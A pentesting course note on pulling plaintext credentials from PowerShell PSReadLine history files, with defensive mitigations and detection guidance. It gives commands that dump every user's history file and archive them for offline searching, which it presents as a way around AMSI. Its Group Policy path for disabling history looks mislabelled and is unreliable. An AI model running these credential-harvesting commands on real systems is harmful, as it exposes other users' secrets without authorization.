---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.18 PowerShell History File"
---

# 18 - PowerShell History File

## Overview

Starting with PowerShell version 5.0 (introduced in Windows 10 and Windows Server 2016), Microsoft introduced a feature called **PSReadLine**. This module enhances the command-line editing experience in the PowerShell console. Among its many features, PSReadLine includes a persistent command history that saves everything a user types into the PowerShell console to a flat text file on the disk.

From a penetration testing and red-teaming perspective, the PowerShell history file is an absolute goldmine. System administrators frequently type passwords, pass API keys as parameters to cloud CLI tools, instantiate `PSCredential` objects, and execute commands containing sensitive environment variables. Because this history file persists across reboots and terminal sessions, an attacker who gains access to a user's context can simply read this file to uncover plaintext credentials and deep insights into the administrative workflows.

## The Mechanism and Architecture

```text
+-----------------------------------------------------------+
|                   The PSReadLine Flow                     |
|                                                           |
| +---------------------+        +------------------------+ |
| |   Administrator     |        |   PowerShell Console   | |
| |  Types:             |=======>|   (PSReadLine Hook)    | |
| |  $pass = "P@ss123"  |        |                        | |
| +---------------------+        +-----------+------------+ |
|                                            |              |
|                                     Intercepts Input      |
|                                            |              |
|                                            v              |
|                                +-----------+------------+ |
|                                | %APPDATA%\Microsoft\   | |
|                                | Windows\PowerShell\    | |
|                                | PSReadLine\            | |
|                                | ConsoleHost_history.txt| |
|                                +-----------+------------+ |
|                                            |              |
+--------------------------------------------|--------------+
                                             |
                                             v
                                +------------+------------+
                                |      Attacker           |
                                |  (Reads Text File)      |
                                +-------------------------+
```

## Deep Dive: Where is it Stored?

By default, the `ConsoleHost_history.txt` file is stored in the user's `AppData` directory. Because it is located in the user profile, an attacker must have access to that specific user's files. However, if an attacker gains SYSTEM or Local Administrator privileges, they can read the history files of *all* users on the system.

**Default Path:**
`C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

You can also determine the exact location of the history file for the currently logged-in user by querying the PSReadLine options:

```powershell
(Get-PSReadLineOption).HistorySavePath
```

### What kind of data is left behind?

Administrators often perform tasks that inadvertently log sensitive data:

1. **Active Directory Operations**:
   ```powershell
   net user Administrator "NewP@ssw0rd!" /domain
   ```
2. **Creating Credential Objects**:
   ```powershell
   $pass = ConvertTo-SecureString 'Admin12345!' -AsPlainText -Force
   $cred = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
   ```
3. **Cloud and API Interactions**:
   ```powershell
   aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
   az login -u admin@company.com -p "SuperSecretPass"
   ```
4. **Database Connections**:
   ```powershell
   sqlcmd -S sqlserver -U sa -P "dbAdminP@ss"
   ```

## Exploitation Scenarios

### 1. Reading the Current User's History

If you have landed on a host as a low-privileged user, your first step in enumeration should be checking your own history file. While you might only be a standard user, the IT department might have previously opened a PowerShell prompt as your user but passed administrative credentials to a command.

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Via PowerShell:
```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

### 2. Hunting for Other Users' Histories

If you have elevated privileges (e.g., Local Admin), you should parse the history files of every user on the system. This is crucial for lateral movement, as you might find Domain Admin credentials.

```cmd
:: Iterate over all user profiles and read the history file
for /d %i in (C:\Users\*) do @type "%i\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
```

PowerShell approach for bulk extraction:
```powershell
$historyPaths = Get-ChildItem -Path C:\Users -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue -Force
foreach ($file in $historyPaths) {
    Write-Host "========================================="
    Write-Host "File: $($file.FullName)"
    Write-Host "========================================="
    Get-Content $file.FullName
}
```

### 3. Evading Antivirus and AMSI

Sometimes, running enumeration scripts might trigger the Antimalware Scan Interface (AMSI) if you are using known malicious patterns to search for passwords. However, simply using `type` or `Get-Content` on a text file is benign.

If you want to filter for passwords quietly without triggering AMSI alerts related to credential hunting scripts (like WinPEAS or Seatbelt), you can exfiltrate the text files and parse them offline:

```powershell
Compress-Archive -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -DestinationPath C:\Windows\Temp\histories.zip -ErrorAction SilentlyContinue
```
Then, download `histories.zip` to your attacker machine and `grep` for "password", "cred", "securestring", etc.

## Defensive Strategies & Mitigation

If you are an administrator, the existence of `ConsoleHost_history.txt` is a massive liability if you use the CLI for credential management. 

### 1. Disabling History Saves
You can configure PSReadLine to not save history to the disk. This must be placed in the PowerShell Profile (`$PROFILE`) so it applies every time PowerShell starts.

```powershell
Set-PSReadLineOption -HistorySaveStyle SaveNothing
```

### 2. Clearing the History
If you have executed a sensitive command, you should immediately clear the history.
```powershell
Clear-History
# However, Clear-History only clears the in-memory history of the current session!
# To clear the disk file, you must physically delete it or use:
Remove-Item (Get-PSReadLineOption).HistorySavePath
```

### 3. Using Secure Input for Credentials
Never pass plaintext credentials in the CLI argument line. Use `Get-Credential` which spawns a GUI prompt (or secure CLI prompt) that masks the password and does not log it to the history file.
```powershell
$cred = Get-Credential
```

### 4. Group Policy Control
For enterprise environments, administrators can disable PowerShell history globally via Group Policy (GPO):
`Computer Configuration -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn on PowerShell Script Block Logging (Configure PSReadLine settings)`

## Detection and Logging

From a SOC/Blue Team perspective, detecting the abuse of PowerShell history files involves monitoring file access.
- **Event ID 4663**: File Access Audit. Enable auditing on the `%APPDATA%\...\ConsoleHost_history.txt` files. If a process other than `powershell.exe` or `pwsh.exe` reads this file (e.g., `cmd.exe`, `explorer.exe`, or a custom payload), it is highly suspicious.
- **Event ID 4104**: Script Block Logging. Watch for attackers executing loops over the `C:\Users\` directory searching for `ConsoleHost_history.txt`.

## Chaining Opportunities

- **[[17 - Stored Credentials Files]]**: Often, the PSReadLine history will reveal exactly where an administrator placed a backup file or a script containing stored credentials.
- **[[20 - Pass the Hash on Local Admin]]**: If the history reveals an NTLM hash or plaintext password for a local admin account, you can use PtH to pivot to other machines.
- **[[22 - LAPS]]**: An administrator might have used a PowerShell cmdlet to retrieve a LAPS password. If they passed it into a script in the same session, it might be sitting in the history file in plaintext.

## Related Notes
- [[19 - DPAPI]]
- [[21 - Password in GPP]]
- [[24 - Abusing SeTakeOwnershipPrivilege]]
